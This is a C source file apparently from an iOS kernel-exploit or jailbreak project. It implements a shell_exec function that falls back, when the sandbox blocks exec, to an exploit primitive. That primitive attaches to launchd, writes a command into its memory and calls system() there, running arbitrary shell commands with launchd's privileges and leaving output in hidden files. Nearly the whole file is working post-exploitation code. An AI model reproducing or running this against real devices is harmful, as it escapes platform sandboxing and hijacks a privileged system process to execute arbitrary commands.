#include "shell_exec.h"
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>
#include <errno.h>

#import "kexploit/RemoteCall.h"
#import "exploit_globals.h"

// Unique temp paths to avoid collisions
#define SHELL_OUT_PATH  "/var/mobile/.cf_shell_out"
#define SHELL_ERR_PATH  "/var/mobile/.cf_shell_err"
#define SHELL_RC_PATH   "/var/mobile/.cf_shell_rc"

/// Try popen first (works on jailbroken devices).
/// If that fails (exit 127 = iOS sandbox blocks exec), fall back to
/// remote_call through launchd, which has full process-exec entitlements.
char *shell_exec(const char *command, int *exit_code) {
    if (!command) return NULL;

    // ── Attempt 1: popen (fast, works if exec is allowed) ──
    setenv("PATH", "/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin", 0);

    size_t cmdLen = strlen(command) + 16;
    char *fullCmd = (char *)malloc(cmdLen);
    if (!fullCmd) return NULL;
    snprintf(fullCmd, cmdLen, "%s 2>&1", command);

    FILE *fp = popen(fullCmd, "r");
    free(fullCmd);

    if (fp) {
        size_t capacity = 8192;
        size_t length = 0;
        char *buffer = (char *)malloc(capacity);
        if (!buffer) { pclose(fp); return NULL; }

        char chunk[4096];
        while (fgets(chunk, sizeof(chunk), fp)) {
            size_t chunkLen = strlen(chunk);
            if (length + chunkLen + 1 > capacity) {
                capacity *= 2;
                if (capacity > 512000) break;
                char *newBuf = (char *)realloc(buffer, capacity);
                if (!newBuf) break;
                buffer = newBuf;
            }
            memcpy(buffer + length, chunk, chunkLen);
            length += chunkLen;
        }
        buffer[length] = '\0';

        int status = pclose(fp);
        int code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;

        // If exit code is NOT 127, popen worked — return result
        if (code != 127 || length > 30) {
            if (exit_code) *exit_code = code;
            return buffer;
        }
        // Exit 127 with tiny output = shell can't find commands → fall through
        free(buffer);
    }

    // ── Attempt 2: remote_call via launchd ──
    if (!g_exploitDone) {
        char *err = strdup("Error: shell not available (sandbox blocks exec and exploit not active)");
        if (exit_code) *exit_code = 127;
        return err;
    }

    // Build a wrapped command that writes stdout+stderr to a file
    // and the exit code to another file.
    // launchd's /bin/sh has full exec entitlements.
    //
    // Format: /bin/sh -c '{ <command> ; } > /out 2>&1; echo $? > /rc'
    const char *fmt = "/bin/sh -c '{ %s ; } > %s 2>&1; echo $? > %s'";
    size_t wrapLen = strlen(command) + strlen(SHELL_OUT_PATH) + strlen(SHELL_RC_PATH) + strlen(fmt) + 32;

    // g_RC_trojanMem is one page (4096 bytes) — cap the command
    if (wrapLen > 4000) {
        if (exit_code) *exit_code = -1;
        return strdup("Error: command too long (max ~3500 chars for remote exec)");
    }
    char *wrapped = (char *)malloc(wrapLen);
    if (!wrapped) {
        if (exit_code) *exit_code = -1;
        return strdup("Error: malloc failed for remote shell command");
    }
    snprintf(wrapped, wrapLen, fmt, command, SHELL_OUT_PATH, SHELL_RC_PATH);

    // Clean up previous output files
    unlink(SHELL_OUT_PATH);
    unlink(SHELL_RC_PATH);

    // Init remote call to launchd
    int initRet = init_remote_call("launchd", true);
    if (initRet != 0) {
        free(wrapped);
        if (exit_code) *exit_code = -1;
        char msg[128];
        snprintf(msg, sizeof(msg), "Error: failed to attach to launchd (code %d)", initRet);
        return strdup(msg);
    }

    // Write the command string into the remote process's shared memory
    bool wrote = remote_writeStr(g_RC_trojanMem, wrapped);
    free(wrapped);
    if (!wrote) {
        destroy_remote_call();
        if (exit_code) *exit_code = -1;
        return strdup("Error: failed to write command to remote memory");
    }

    // Call system() in launchd's context with the command at g_RC_trojanMem
    uint64_t ret = do_remote_call_stable(15000, "system",
                                          g_RC_trojanMem, 0, 0, 0, 0, 0, 0, 0);

    destroy_remote_call();

    // Read the output file
    char *result = NULL;
    FILE *outFile = fopen(SHELL_OUT_PATH, "r");
    if (outFile) {
        size_t cap = 8192;
        size_t len = 0;
        result = (char *)malloc(cap);
        if (result) {
            char chunk[4096];
            while (fgets(chunk, sizeof(chunk), outFile)) {
                size_t cl = strlen(chunk);
                if (len + cl + 1 > cap) {
                    cap *= 2;
                    if (cap > 512000) break;
                    char *nb = (char *)realloc(result, cap);
                    if (!nb) break;
                    result = nb;
                }
                memcpy(result + len, chunk, cl);
                len += cl;
            }
            result[len] = '\0';
        }
        fclose(outFile);
        unlink(SHELL_OUT_PATH);
    }

    // Read the exit code file
    int rc = (int)ret;  // fallback: use system()'s return value
    FILE *rcFile = fopen(SHELL_RC_PATH, "r");
    if (rcFile) {
        char rcBuf[16] = {0};
        if (fgets(rcBuf, sizeof(rcBuf), rcFile)) {
            rc = atoi(rcBuf);
        }
        fclose(rcFile);
        unlink(SHELL_RC_PATH);
    }

    if (exit_code) *exit_code = rc;

    if (!result) {
        result = strdup(rc == 0 ? "(no output)" : "(no output, command may have failed)");
    }

    return result;
}
